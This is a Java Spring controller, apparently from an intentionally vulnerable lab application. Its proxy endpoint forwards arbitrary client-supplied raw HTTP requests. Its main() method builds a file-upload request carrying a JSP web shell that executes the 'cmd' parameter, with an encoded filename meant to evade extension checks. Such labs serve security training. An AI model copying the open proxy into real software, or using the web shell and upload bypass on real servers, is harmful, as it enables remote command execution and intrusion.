package org.javaweb.vuln.controller;

import com.alibaba.fastjson.JSON;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.javaweb.utils.StringUtils.exceptionToString;
import static org.javaweb.vuln.utils.HttpClient.proxyRequest;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@Controller
@RequestMapping("/Request/")
public class RequestController {

	@ResponseBody
	@PostMapping(value = "/proxy.do", consumes = APPLICATION_JSON_VALUE)
	public Map<String, Object> xerces(@RequestBody Map<String, Object> map) {
		Map<String, Object> data   = new LinkedHashMap<String, Object>();
		String              req    = (String) map.get("req");
		boolean             isHttp = "http".equals(map.get("protocol"));

		try {
			proxyRequest(req, isHttp, data);
		} catch (IOException e) {
			data.put("msg", exceptionToString(e));
		}

		return data;
	}

	public static void main(String[] args) throws IOException {
//		String req = new String(new byte[]{80, 79, 83, 84, 32, 47, 70, 105, 108, 101, 85, 112, 108, 111, 97, 100, 47, 117, 112, 108, 111, 97, 100, 46, 100, 111, 32, 72, 84, 84, 80, 47, 49, 46, 49, 13, 10, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 58, 32, 80, 111, 115, 116, 109, 97, 110, 82, 117, 110, 116, 105, 109, 101, 47, 55, 46, 50, 57, 46, 48, 13, 10, 65, 99, 99, 101, 112, 116, 58, 32, 42, 47, 42, 13, 10, 80, 111, 115, 116, 109, 97, 110, 45, 84, 111, 107, 101, 110, 58, 32, 98, 102, 53, 57, 56, 102, 53, 53, 45, 102, 102, 51, 98, 45, 52, 54, 99, 97, 45, 98, 102, 51, 53, 45, 51, 102, 51, 55, 53, 56, 52, 97, 100, 51, 100, 99, 13, 10, 72, 111, 115, 116, 58, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 56, 48, 48, 48, 13, 10, 65, 99, 99, 101, 112, 116, 45, 69, 110, 99, 111, 100, 105, 110, 103, 58, 32, 103, 122, 105, 112, 44, 32, 100, 101, 102, 108, 97, 116, 101, 44, 32, 98, 114, 13, 10, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 58, 32, 107, 101, 101, 112, 45, 97, 108, 105, 118, 101, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 58, 32, 109, 117, 108, 116, 105, 112, 97, 114, 116, 47, 102, 111, 114, 109, 45, 100, 97, 116, 97, 59, 32, 98, 111, 117, 110, 100, 97, 114, 121, 61, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 50, 50, 50, 55, 56, 50, 48, 49, 50, 53, 53, 51, 52, 50, 48, 52, 56, 51, 50, 53, 53, 53, 55, 49, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 76, 101, 110, 103, 116, 104, 58, 32, 53, 48, 50, 13, 10, 13, 10, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 50, 50, 50, 55, 56, 50, 48, 49, 50, 53, 53, 51, 52, 50, 48, 52, 56, 51, 50, 53, 53, 53, 55, 49, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 68, 105, 115, 112, 111, 115, 105, 116, 105, 111, 110, 58, 32, 102, 111, 114, 109, 45, 100, 97, 116, 97, 59, 32, 110, 97, 109, 101, 61, 34, 100, 105, 114, 34, 13, 10, 13, 10, 47, 85, 115, 101, 114, 115, 47, 121, 122, 47, 73, 100, 101, 97, 80, 114, 111, 106, 101, 99, 116, 115, 47, 106, 97, 118, 97, 119, 101, 98, 45, 118, 117, 108, 110, 47, 13, 10, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 50, 50, 50, 55, 56, 50, 48, 49, 50, 53, 53, 51, 52, 50, 48, 52, 56, 51, 50, 53, 53, 53, 55, 49, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 68, 105, 115, 112, 111, 115, 105, 116, 105, 111, 110, 58, 32, 102, 111, 114, 109, 45, 100, 97, 116, 97, 59, 32, 110, 97, 109, 101, 61, 34, 102, 105, 108, 101, 34, 59, 32, 102, 105, 108, 101, 110, 97, 109, 101, 61, 34, 61, 63, 85, 84, 70, 45, 56, 63, 81, 63, 61, 69, 54, 61, 66, 53, 61, 56, 66, 61, 69, 56, 61, 65, 70, 61, 57, 53, 61, 50, 69, 106, 115, 112, 63, 61, 34, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 58, 32, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 111, 99, 116, 101, 116, 45, 115, 116, 114, 101, 97, 109, 13, 10, 13, 10, 60, 37, 61, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 105, 111, 46, 73, 79, 85, 116, 105, 108, 115, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 114, 101, 113, 117, 101, 115, 116, 46, 103, 101, 116, 80, 97, 114, 97, 109, 101, 116, 101, 114, 40, 34, 99, 109, 100, 34, 41, 41, 46, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 40, 41, 41, 37, 62, 13, 10, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 50, 50, 50, 55, 56, 50, 48, 49, 50, 53, 53, 51, 52, 50, 48, 52, 56, 51, 50, 53, 53, 53, 55, 49, 45, 45, 13, 10});

		String req = "POST /FileUpload/upload.do HTTP/1.1\n" +
				"Host: 10.10.99.2:8000\n" +
				"Content-Length: 539\n" +
				"Cache-Control: max-age=0\n" +
				"Upgrade-Insecure-Requests: 1\n" +
				"Origin: null\n" +
				"Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\n" +
				"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9,en;q=0.8\n" +
				"Connection: close\n" +
				"\n" +
				"------WebKitFormBoundaryWqGd83IIbg2U327I\n" +
				"Content-Disposition: form-data; name=\"username\"\n" +
				"\n" +
				"admin\n" +
				"------WebKitFormBoundaryWqGd83IIbg2U327I\n" +
				"Content-Disposition: form-data; name=\"file\"; filename=\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\"\n" +
				"Content-Type: application/octet-stream\n" +
				"\n" +
				"<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream())%>\n" +
				"------WebKitFormBoundaryWqGd83IIbg2U327I\n" +
				"Content-Disposition: form-data; name=\"submit\"\n" +
				"\n" +
				"Submit\n" +
				"------WebKitFormBoundaryWqGd83IIbg2U327I--\n";

//		String s = proxyRequest(req);
//		System.out.println(s);
		Map<String, String> data = new LinkedHashMap<>();
//		data.put("req", "GET / HTTP/1.1\n" +
//				"Host: localhost:8003\n" +
//				"User-Agent: curl/7.77.0\n" +
//				"Accept: */*\n");

		data.put("req", req);
		data.put("protocol", "http");

		System.out.println(JSON.toJSONString(data));
	}

}
